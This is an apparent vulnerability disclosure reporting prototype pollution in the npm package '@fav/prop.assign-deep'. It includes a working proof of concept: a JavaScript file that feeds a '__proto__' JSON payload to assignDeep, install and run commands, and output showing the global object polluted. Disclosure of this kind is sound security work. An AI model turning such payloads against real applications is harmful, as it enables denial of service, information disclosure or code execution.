# Description

`@fav/prop.assign-deep` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```javascript
// poc.js
var assignDeep = require('@fav/prop.assign-deep');

console.log("Before", {}.status)
assignDeep({}, JSON.parse('{ "__proto__" : { "status" : "polluted!" } }'));
console.log("After:", status);
```
2. Execute the following commands in the terminal:
```bash
npm i @fav/prop.assign-deep # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: polluted!
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE
